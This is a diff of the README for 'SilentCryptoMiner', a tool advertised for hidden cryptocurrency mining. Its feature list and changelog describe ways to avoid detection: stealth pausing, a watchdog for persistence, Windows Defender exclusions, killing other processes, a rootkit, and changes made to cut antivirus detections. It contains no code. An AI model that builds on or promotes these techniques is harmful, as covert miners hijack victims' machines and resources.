@@ -1,8 +1,8 @@
 <img src="https://github.com/UnamSanctam/SilentCryptoMiner/blob/master/SilentCryptoMiner.png?raw=true">
 
-# SilentCryptoMiner v3.2.0 - Miner for ETH, ETC, XMR, RTM & many more
+# SilentCryptoMiner v3.3.0 - Miner for ETC, RVN, XMR, RTM & many more
 
-A free silent (hidden) native cryptocurrency miner capable of mining ETH, ETC, XMR, RTM and much more, with many features suited for mining silently.
+A free silent (hidden) native cryptocurrency miner capable of mining ETC, RVN, XMR, RTM and much more, with many features suited for mining silently.
 
 This miner can mine all the following algorithms and thus any cryptocurrency that uses one of them:
 <details>
@@ -14,6 +14,11 @@ This miner can mine all the following algorithms and thus any cryptocurrency tha
 	<tr><td>ethash</td><td>EthereumPoW, Metaverse, Callisto, QuarkChain, EtherGem, Etho, Expanse, Ellaism</td></tr>
 	<tr><td>etchash</td><td>Ethereum Classic</td></tr>
 	<tr><td>ubqhash</td><td>Ubiq</td></tr>
+	<tr><td>kawpow</td><td>Ravencoin, Neoxa, Meowcoin</td></tr>
+	<tr><td>firopow</td><td>Firo, Kiirocoin</td></tr>
+	<tr><td>progpow</td><td>Sero</td></tr>
+	<tr><td>progpowz</td><td>Zano</td></tr>
+	<tr><td>evrprogpow</td><td>Evrmore</td></tr>
 	<tr><td>cn/gpu</td><td>Conceal, Ryo, Equilibria</td></tr>
 	<tr><td>argon2/chukwa</td><td>2ACoin</td></tr>
 	<tr><td>rx/arq</td><td>ArQmA</td></tr>
@@ -23,7 +28,6 @@ This miner can mine all the following algorithms and thus any cryptocurrency tha
 	<tr><td>cn-pico</td><td>Kryptokrona</td></tr>
 	<tr><td>cn/half</td><td>Masari</td></tr>
 	<tr><td>argon2/ninja</td><td>NinjaCoin</td></tr>
-	<tr><td>kawpow</td><td>Ravencoin</td></tr>
 	<tr><td>rx/sfx</td><td>Safex</td></tr>
 	<tr><td>cn/r</td><td>Sumokoin</td></tr>
 	<tr><td>cn-pico/tlo</td><td>Talleo</td></tr>
@@ -53,7 +57,7 @@ This miner can mine all the following algorithms and thus any cryptocurrency tha
 * Idle Mining - Can be configured to mine at different CPU and GPU usages or not at all while computer is or isn't in use
 * Stealth - Pauses the miner and clears the GPU memory and RAM while any of the programs in the "Stealth Targets" option are open
 * Watchdog - Monitors the miner file, miner processes and startup entry and restores the miner if anything is removed or killed
-* Multiple Miners - Can create multiple miners to run at the same time, for example one XMR (CPU) miner and one ETH (GPU) miner
+* Multiple Miners - Can create multiple miners to run at the same time, for example one XMR (CPU) miner and one RVN (GPU) miner
 * CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
 * Windows Defender Exclusions - Can add exclusions into Windows Defender after being started to avoid being detected
 * Process Killer - Constantly checks for any programs in the "Kill Targets" list and kills them if found
@@ -78,6 +82,40 @@ You can find the web panel that the miner officially supports here: [UnamWebPane
 
 ## Changelog
 
+### 3.3.0 (24/08/2023)
+* Added the KawPow (kawpow) algorithm directly into the GPU miner
+* Added new FiroPow (firopow) algorithm
+* Added new ProgPow (progpow) algorithm
+* Added new ProgPowZ (progpowz) algorithm
+* Added new EvrProgPow (evrprogpow) algorithm
+* Implemented KawPow, FiroPow, EvrProgPow, ProgPow and ProgPowZ using only OpenCL for both Nvidia and AMD to bypass large CUDA NVRTC library requirement
+* Rewrote most of the GPU miner to add support for multiple algorithm families and to greatly improve stability and reliability
+* Added Sero-Proxy protocol to be able to mine Sero (ProgPow)
+* Removed KawPow (kawpow) algorithm from the XMR miner and also the large CUDA NVRTC library to make sure no one accidentally uses it
+* Re-added the Panthera (rx/xla) algorithm
+* Added Zephyr coin (rx/0) solo mining support
+* Moved the XMR miner "GPU Mining" option into the "Advanced" tab to discourage unprofitable XMR GPU mining
+* Moved the "Use Rootkit" option into the "Advanced Options" for better clarity regarding its complexity
+* Changed Task Scheduler Task creation from Powershell to only using the command line with a temporary XML file
+* Changed MSR driver path from using a static library path to a dynamically generated path
+* Modified embedded file encryption and decryption to reduce heuristic detections
+* Changed the code compiler build to different one to greatly reduce the compiler-caused antivirus detections
+* Improved the external compiler execution commands by better forcing absolute paths in commands
+* Added a mutex into the miner installer/injector to make it checkable by the watchdog
+* Reduced the watchdog checking interval for better persistance
+* Removed unused helper functions
+* Rewrote uninstallers miner killer function to work with Process IDs above the ushort limit
+* Changed unicode string initialization from a macro to a function to reduce the final code size
+* Changed string formatting from using the built-in Windows API to instead use a much smaller custom function
+* Moved web panel reporting to happen before CPU idle usage change in order to help make the hashrate look less confusing
+* Improved RandomX database regeneration speed when leaving "Stealth" on pools with infrequent new jobs
+* Fixed weird default "Stealth on Fullscreen" configuration value when "Run as System" was disabled
+* Fixed possible null terminator string length counting problem inside the GPU checking function
+* Reduced unnecessary recursive directory creation function stack size
+* Changed miners execution state to no longer always semi-block sleep mode on some computers
+* Restructured the algorithm selection list to be easier to use
+* Added semi-CLI functionality for building miners through the command line
+* Updated the rootkit to a new version
 ### 3.2.0 (01/04/2023)
 * Changed miner settings from being passed through the command line to instead be passed directly through the PEB
 * Changed XMR miner to clear RAM during "Stealth" when possible
@@ -111,28 +149,6 @@ You can find the web panel that the miner officially supports here: [UnamWebPane
 * Fixed support for Unicode characters inside the "Assembly" settings
 * Updated both miners
 * Added Portuguese (Brazil) translation (MatheusOliveira-dev)
-### 3.1.0 (31/10/2022)
-* Changed process creation from undocumented API calls to direct system calls
-* Added process parent spoofing with token impersonation when creating processes
-* Created custom process parameter creation to avoid API calls
-* Added system call process enumeration for parent spoofing
-* Updated SysWhispers2 with custom process creation definitions and more
-* Modified SysWhispers2 assembler instructions to bypass new detection
-* Changed all indirect API calls to direct system calls
-* Changed compiler binaries to reduce some compiler caused detections
-* Fixed known XMR "GPU Mining" compilation error with new compiler
-* Fixed XMR GPU library location checking on some systems
-* Changed GPU memory checking from CUDA API to NVML for much better accuracy
-* Updated ethminer CUDA and OpenCL mining implementations
-* Updated ethash, etchash and ubqhash algorithm implementation
-* Added improved CUDA and OpenCL automatic restart on error or crash
-* Improved GPU limit sleep time accuracy for powerful GPU cards
-* Removed ETH from the preset list due to the ETH merge from PoW to PoS
-* Added EthereumPoW (ETHW) fork of ETH to the preset list
-* Rewrote website blocking to avoid using string to reduce dependencies
-* Updated rootkit and fixed some rootkit bugs
-* Fixed many miscellaneous bugs
-* Updated xmrig
 
 [You can view the full Changelog here](CHANGELOG.md)
 
